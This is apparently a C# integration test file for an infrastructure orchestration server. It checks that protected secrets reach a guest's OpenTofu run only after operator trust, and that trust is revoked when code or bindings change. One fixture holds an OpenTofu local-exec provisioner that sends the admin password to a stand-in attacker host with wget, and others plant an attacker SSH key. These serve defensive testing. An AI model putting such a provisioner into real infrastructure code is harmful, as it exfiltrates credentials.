using System.Net;
using System.Net.Http.Json;
using System.Text.Json.Nodes;
using Microsoft.EntityFrameworkCore;
using Octopushy.Agent.V1;
using Octopushy.Server.Data;
using Octopushy.Server.Orchestration;
using Octopushy.Tests.Definitions;

namespace Octopushy.Tests.Server;

/// <summary>
/// A protected secret on a guest that belongs to no cluster: the guest's page shows what it would
/// trust, and Trust guest records the grants. The checks are the store's, so they hold whatever
/// the repository's policy says.
/// </summary>
[Collection(PostgresCollection.Name)]
public class GuestTrustTests(PostgresFixture postgres)
{
    private const string Key = "db/password";
    private const string Password = "a-database-password-of-this-test";
    private const string Guest = ContainerGuestTests.Guest;
    private const string GuestFile = ContainerGuestTests.GuestPath;
    private const string Token = "proxmox/korriban/read-only-token";
    private const string AutomaticEverything = "policy: { approval: automatic, destructive: automatic }";
    private const string ManualEverything = "policy: { approval: manual, destructive: manual }";
    private const string AttackerKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackerKeyAttackerKeyAttackerKeyAttackerKey attacker";

    private static TestRepository Repository(string policy = "")
    {
        var test = ContainerGuestTests.Repository();
        var text = File.ReadAllText(Path.Combine(test.Root, GuestFile));
        test.Write(GuestFile, text.TrimEnd('\n') + $"\n  secrets:\n    admin_password: {{ store: {Key} }}\naccess:\n  sshAuthorizedKeys: [\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeployKeyDeployKeyDeployKeyDeployKey deploy\"]");
        // Only the container: the test agent answers one guest's steps.
        test.Delete("labs/home/proxmox/korriban/guests/krb-app-01");
        test.Write("labs/home/lab.yaml", $"schemaVersion: 1\nname: Home\nexecution: {{ agentLabels: [home] }}\n{policy}\n");
        return test;
    }

    private static async Task<(ServerHarness Server, FakeAgent Agent, HttpClient Client)> StartAsync(PostgresFixture postgres, TestRepository repository, params string[] protect)
    {
        var server = await ServerHarness.StartAsync(postgres, repository);
        await server.SetSecretAsync(Key, Password);
        await server.SetSecretAsync("db/other", "another-database-password-here");
        var agent = await server.ConnectAgentAsync("home");
        var client = await InstallationTrustTests.AuthenticateAsync(server);
        foreach (var key in protect)
            (await client.PostAsJsonAsync("/api/variables/protection", new { key, @protected = true })).EnsureSuccessStatusCode();
        await server.SyncAndTrustAsync(client);
        return (server, agent, client);
    }

    private static async Task<JsonObject> DetailAsync(ServerHarness server, HttpClient client)
    {
        var id = (await server.ResourceAsync(Guest)).Id;
        return (await client.GetFromJsonAsync<JsonObject>($"/api/guests/{id}"))!;
    }

    private static async Task<HttpResponseMessage> TrustAsync(ServerHarness server, HttpClient client, string? digest)
    {
        var id = (await server.ResourceAsync(Guest)).Id;
        return await client.PostAsJsonAsync($"/api/guests/{id}/trust", new { codeDigest = digest });
    }

    private static async Task<string> ShownDigestAsync(ServerHarness server, HttpClient client) =>
        (await DetailAsync(server, client))["trust"]!["codeDigest"]!.GetValue<string>();

    /// <summary>Everything an agent is handed for a while, answering what keeps the run moving.</summary>
    private static async Task<List<Assignment>> DriveAsync(ServerHarness server, FakeAgent agent, int ticks = 6)
    {
        var seen = new List<Assignment>();
        for (var i = 0; i < ticks; i++)
        {
            await server.TickAsync();
            foreach (var assignment in agent.TakeAssignments())
            {
                seen.Add(assignment);
                if (assignment.Action == "observe")
                    await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject());
            }
        }

        return seen;
    }

    private static Task<int> ReleasesAsync(ServerHarness server) =>
        server.QueryAsync(db => db.SecretResolutions.CountAsync(r => r.Key == Key));

    private static async Task FinishAsync(ServerHarness server, FakeAgent agent, bool approve = false)
    {
        for (var i = 0; i < 30; i++)
        {
            await server.TickAsync();
            var run = await server.LatestRunAsync(Guest, Operations.Provision);
            if (run.Status == RunStatuses.AwaitingApproval && approve)
            {
                var approval = run.Steps.Single(s => s.Name == StepNames.Approval);
                await server.Engine.ApproveAsync(run.Id, approval.Id, approval.PlanSha256!, "ops", null, CancellationToken.None);
            }

            foreach (var assignment in agent.TakeAssignments())
            {
                switch (assignment.Action)
                {
                    case "observe":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject());
                        break;
                    case "preview":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, FakeAgent.Plan(create: 1), artifacts: FakeAgent.PlanArtifact());
                        break;
                    case "apply":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject { ["outputs"] = new JsonObject(), ["sensitiveOutputs"] = new JsonArray() });
                        break;
                    case "verify-guest":
                        await agent.ReportAsync(assignment, Outcome.Succeeded, new JsonObject { ["present"] = true });
                        return;
                }
            }
        }

        Assert.Fail("the run did not finish");
    }

    [Theory]
    [InlineData("")]
    [InlineData(AutomaticEverything)]
    [InlineData(ManualEverything)]
    public async Task A_guest_of_a_protected_secret_gets_it_only_after_trust_whatever_the_policy(string policy)
    {
        using var repository = Repository(policy);
        var (server, agent, client) = await StartAsync(postgres, repository, Key);
        await using var _ = server;
        using var __ = client;

        var seen = await DriveAsync(server, agent);
        Assert.DoesNotContain(seen, a => a.Executor == "opentofu");
        var run = await server.LatestRunAsync(Guest, Operations.Provision);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.StartsWith("Waiting for trust", run.Detail);
        Assert.Equal(0, await ReleasesAsync(server));

        // The page says why, and what trusting means.
        var trust = (await DetailAsync(server, client))["trust"]!;
        Assert.Equal([Key], trust["keys"]!.AsArray().Select(k => k!.GetValue<string>()));
        Assert.False(trust["trusted"]!.GetValue<bool>());
        Assert.Null(trust["cluster"]);
        Assert.Equal(64, trust["codeDigest"]!.GetValue<string>().Length);
        Assert.StartsWith("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeploy", trust["execution"]!["guest"]!["access"]!["sshAuthorizedKeys"]![0]!.GetValue<string>());
        Assert.Equal(Key, trust["execution"]!["secrets"]!["admin_password"]!.GetValue<string>());
        Assert.Equal("blocked", (await DetailAsync(server, client))["guest"]!["status"]!.GetValue<string>());

        (await TrustAsync(server, client, trust["codeDigest"]!.GetValue<string>())).EnsureSuccessStatusCode();
        await server.TickAsync();
        var preview = await agent.NextAsync("preview");
        Assert.DoesNotContain(Password, preview.Secrets.Values);
        await agent.ReportAsync(preview, Outcome.Succeeded, FakeAgent.Plan(create: 1), artifacts: FakeAgent.PlanArtifact());
        if (policy == ManualEverything)
        {
            var waiting = await server.LatestRunAsync(Guest, Operations.Provision);
            var approval = waiting.Steps.Single(s => s.Name == StepNames.Approval);
            await server.Engine.ApproveAsync(waiting.Id, approval.Id, approval.PlanSha256!, "ops", null, CancellationToken.None);
        }

        var apply = await agent.NextAsync("apply");
        Assert.Equal(Password, apply.Secrets["recipe.TF_VAR_admin_password"]);
        Assert.True(JsonNode.Parse(apply.InputJson)!["reviewed"] is not null, "the agent is told to keep OpenTofu to the reviewed code");

        var after = (await DetailAsync(server, client))["trust"]!;
        Assert.True(after["trusted"]!.GetValue<bool>());
        Assert.Equal("ops", after["trustedBy"]!.GetValue<string>());
    }

    [Theory]
    [InlineData("")]
    [InlineData(AutomaticEverything)]
    [InlineData(ManualEverything)]
    public async Task A_changed_root_blocks_the_guest_again_whatever_the_policy(string policy)
    {
        // The attack: trust a harmless root, then have it send the password away.
        using var repository = Repository(policy);
        var (server, agent, client) = await StartAsync(postgres, repository, Key);
        await using var _ = server;
        using var __ = client;
        (await TrustAsync(server, client, await ShownDigestAsync(server, client))).EnsureSuccessStatusCode();
        await FinishAsync(server, agent, approve: true);
        var released = await ReleasesAsync(server);
        Assert.True(released > 0, "the apply should have received the password");

        repository.Write("modules/opentofu/test-vm/main.tf", """
            resource "terraform_data" "leak" {
              provisioner "local-exec" {
                command = "wget -q -O- https://attacker.invalid/$TF_VAR_admin_password"
              }
            }
            """);
        server.Commit("Change the root");
        await server.SyncAsync();

        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains(Password));
        Assert.DoesNotContain(withheld, a => a.Action == "apply");
        var run = await server.LatestRunAsync(Guest, Operations.Provision);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.Contains("changed since it was granted", run.Detail);
        Assert.Equal(released, await ReleasesAsync(server));
        Assert.False((await DetailAsync(server, client))["trust"]!["trusted"]!.GetValue<bool>());

        // Trust again, from the new digest, and it goes on.
        (await TrustAsync(server, client, await ShownDigestAsync(server, client))).EnsureSuccessStatusCode();
        await server.TickAsync();
        Assert.Equal("preview", (await agent.NextAsync("preview")).Action);
    }

    [Theory]
    [InlineData("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeployKeyDeployKeyDeployKeyDeployKey deploy", AttackerKey, "a key that can log in")]
    [InlineData("cores: 1", "cores: 4", "other hardware")]
    public async Task A_changed_binding_blocks_the_guest_again_with_no_line_of_code_changed(string from, string to, string what)
    {
        using var repository = Repository(AutomaticEverything);
        var (server, agent, client) = await StartAsync(postgres, repository, Key);
        await using var _ = server;
        using var __ = client;
        (await TrustAsync(server, client, await ShownDigestAsync(server, client))).EnsureSuccessStatusCode();
        await FinishAsync(server, agent);
        var released = await ReleasesAsync(server);

        var text = await File.ReadAllTextAsync(Path.Combine(repository.Root, GuestFile));
        Assert.Contains(from, text);
        repository.Write(GuestFile, text.Replace(from, to));
        server.Commit($"Change {what}");
        await server.SyncAsync();

        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains(Password));
        var run = await server.LatestRunAsync(Guest, Operations.Provision);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.Contains("Waiting for trust", run.Detail);
        Assert.Equal(released, await ReleasesAsync(server));
    }

    [Fact]
    public async Task A_different_key_in_the_binding_is_not_covered_by_the_grant_of_the_first()
    {
        using var repository = Repository(AutomaticEverything);
        var (server, agent, client) = await StartAsync(postgres, repository, Key, "db/other");
        await using var _ = server;
        using var __ = client;
        (await TrustAsync(server, client, await ShownDigestAsync(server, client))).EnsureSuccessStatusCode();
        await FinishAsync(server, agent);

        repository.Write(GuestFile, (await File.ReadAllTextAsync(Path.Combine(repository.Root, GuestFile))).Replace($"store: {Key}", "store: db/other"));
        server.Commit("Bind another entry");
        await server.SyncAsync();

        var withheld = await DriveAsync(server, agent);
        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains("another-database-password-here"));
        var run = await server.LatestRunAsync(Guest, Operations.Provision);
        Assert.Equal(RunStatuses.Blocked, run.Status);
        Assert.Contains("db/other", run.Detail);
    }

    [Fact]
    public async Task Trust_is_refused_when_what_the_operator_saw_is_not_what_is_declared_now()
    {
        using var repository = Repository(AutomaticEverything);
        var (server, agent, client) = await StartAsync(postgres, repository, Key);
        await using var _ = server;
        using var __ = client;
        var shown = await ShownDigestAsync(server, client);

        repository.Write("modules/opentofu/test-vm/main.tf", """resource "terraform_data" "leak" {}""");
        server.Commit("Change the root after it was shown");
        await server.SyncAsync();

        var refused = await TrustAsync(server, client, shown);
        Assert.Equal(HttpStatusCode.Conflict, refused.StatusCode);
        Assert.Contains("changed since", await refused.Content.ReadAsStringAsync());
        Assert.Equal(HttpStatusCode.Conflict, (await TrustAsync(server, client, null)).StatusCode);
        Assert.Equal(0, await server.QueryAsync(db => db.SecretGrants.CountAsync()));
        var seen = await DriveAsync(server, agent);
        Assert.DoesNotContain(seen, a => a.Executor == "opentofu");
    }

    [Fact]
    public async Task A_cluster_member_is_trusted_through_its_cluster()
    {
        using var repository = ClusterDefinitionTests.Repository();
        var server = await ServerHarness.StartAsync(postgres, repository);
        await using var _ = server;
        await server.SetSecretAsync("dns/admin", "a-shared-dns-admin-password");
        using var client = await InstallationTrustTests.AuthenticateAsync(server);
        (await client.PostAsJsonAsync("/api/variables/protection", new { key = "dns/admin", @protected = true })).EnsureSuccessStatusCode();
        await server.SyncAndTrustAsync(client);

        var id = (await server.ResourceAsync(ClusterDefinitionTests.Secondary)).Id;
        var trust = (await client.GetFromJsonAsync<JsonObject>($"/api/guests/{id}"))!["trust"]!;
        Assert.Equal(ClusterDefinitionTests.Cluster, trust["cluster"]!.GetValue<string>());

        var refused = await client.PostAsJsonAsync($"/api/guests/{id}/trust", new { codeDigest = trust["codeDigest"]!.GetValue<string>() });
        Assert.Equal(HttpStatusCode.Conflict, refused.StatusCode);
        Assert.Contains("Trust cluster", await refused.Content.ReadAsStringAsync());
        Assert.Equal(0, await server.QueryAsync(db => db.SecretGrants.CountAsync()));
    }

    [Fact]
    public async Task A_guest_that_binds_no_protected_secret_has_nothing_to_trust()
    {
        using var repository = Repository(AutomaticEverything);
        var (server, _, client) = await StartAsync(postgres, repository);
        await using var __ = server;
        using var ___ = client;

        var trust = (await DetailAsync(server, client))["trust"]!;
        Assert.Empty(trust["keys"]!.AsArray());
        var refused = await TrustAsync(server, client, trust["codeDigest"]!.GetValue<string>());
        Assert.Equal(HttpStatusCode.Conflict, refused.StatusCode);
        Assert.Contains("no protected", await refused.Content.ReadAsStringAsync());
    }

    [Fact]
    public async Task Every_protected_key_a_guest_binds_is_granted_the_proxmox_token_included()
    {
        using var repository = Repository(AutomaticEverything);
        var (server, agent, client) = await StartAsync(postgres, repository, Key, Token);
        await using var _ = server;
        using var __ = client;

        var trust = (await DetailAsync(server, client))["trust"]!;
        Assert.Equal([Key, Token], trust["keys"]!.AsArray().Select(k => k!.GetValue<string>()));
        (await TrustAsync(server, client, trust["codeDigest"]!.GetValue<string>())).EnsureSuccessStatusCode();
        var grants = await server.QueryAsync(db => db.SecretGrants.Select(g => g.Key).OrderBy(k => k).ToListAsync());
        Assert.Equal([Key, Token], grants);
        await FinishAsync(server, agent);
    }

    [Fact]
    public async Task A_protected_secret_bound_to_the_state_backend_is_never_released_whatever_was_trusted()
    {
        using var repository = Repository(AutomaticEverything);
        repository.Write("octopushy.yaml", """
            schemaVersion: 1
            stateBackends:
              postgres:
                type: pg
                config: { schema_name: octopushy_state }
                workspace: "{stack}"
                env:
                  PG_CONN_STR: { store: opentofu/pg }
                  LEAK: { store: db/password }
            """);
        var (server, agent, client) = await StartAsync(postgres, repository, Key);
        await using var _ = server;
        using var __ = client;

        var trust = (await DetailAsync(server, client))["trust"]!;
        Assert.Contains("state backend", trust["refusal"]!.GetValue<string>());
        var refused = await TrustAsync(server, client, trust["codeDigest"]!.GetValue<string>());
        Assert.Equal(HttpStatusCode.Conflict, refused.StatusCode);
        Assert.Contains("state backend", await refused.Content.ReadAsStringAsync());
        var seen = await DriveAsync(server, agent);
        Assert.DoesNotContain(seen, a => a.Secrets.Values.Contains(Password));
    }
}
